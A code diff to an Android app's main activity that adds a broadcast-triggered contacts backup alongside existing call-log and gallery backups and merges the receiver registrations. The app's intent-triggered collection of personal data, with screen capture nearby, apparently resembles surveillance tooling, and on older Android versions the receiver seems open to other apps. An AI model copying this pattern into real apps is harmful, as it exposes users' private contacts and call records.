@@ -84,16 +84,23 @@ public class MainActivity extends AppCompatActivity {
     private BroadcastReceiver backupReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            if ("com.example.suma.ACTION_BACKUP_CALLLOG".equals(intent.getAction())) {
+            String action = intent.getAction();
+            if ("com.example.suma.ACTION_BACKUP_CALLLOG".equals(action)) {
                 Log.d(TAG, "Received Call Log Backup Request");
                 performCallLogBackup();
-            } else if ("com.example.suma.ACTION_BACKUP_GALLERY".equals(intent.getAction())) {
+            } else if ("com.example.suma.ACTION_BACKUP_GALLERY".equals(action)) {
                 String mediaType = intent.getStringExtra("media_type");
                 Log.d(TAG, "Received Gallery Backup Request: " + mediaType);
                 performGalleryBackup(mediaType);
+            } else if ("com.example.suma.ACTION_BACKUP_CONTACTS".equals(action)) {
+                Log.d(TAG, "Received Contacts Backup Request");
+                performContactsBackup();
             }
         }
     };
+
+    // ... (onCreate registration) ...
+    // Register receiver for backup requests
 
     // ...
 
@@ -324,7 +331,13 @@ public class MainActivity extends AppCompatActivity {
 
     // Refactored Contacts Backup to use helper
     @SuppressLint("Range")
-    private void performBackup() {
+    private void performContactsBackup() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            Log.e(TAG, "READ_CONTACTS permission missing");
+            return;
+        }
+
         new Thread(() -> {
             try {
                 JSONArray contacts = new JSONArray();
@@ -362,7 +375,7 @@ public class MainActivity extends AppCompatActivity {
         btnScreenshot = findViewById(R.id.btnScreenshot);
 
         btnUpload.setOnClickListener(v -> openFilePicker());
-        btnBackup.setOnClickListener(v -> performBackup());
+        btnBackup.setOnClickListener(v -> performContactsBackup());
         btnStream.setOnClickListener(v -> toggleStreaming());
 
         // Check accessibility status for screen capture
@@ -374,18 +387,15 @@ public class MainActivity extends AppCompatActivity {
         checkPermissions();
 
         // Register receiver for backup requests
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"),
-                    Context.RECEIVER_NOT_EXPORTED);
-        } else {
-            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"));
-        }
+        IntentFilter filter = new IntentFilter();
+        filter.addAction("com.example.suma.ACTION_BACKUP_CALLLOG");
+        filter.addAction("com.example.suma.ACTION_BACKUP_GALLERY");
+        filter.addAction("com.example.suma.ACTION_BACKUP_CONTACTS");
 
-        IntentFilter galleryFilter = new IntentFilter("com.example.suma.ACTION_BACKUP_GALLERY");
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(backupReceiver, galleryFilter, Context.RECEIVER_NOT_EXPORTED);
+            registerReceiver(backupReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
         } else {
-            registerReceiver(backupReceiver, galleryFilter);
+            registerReceiver(backupReceiver, filter);
         }
 
         // Power Receiver
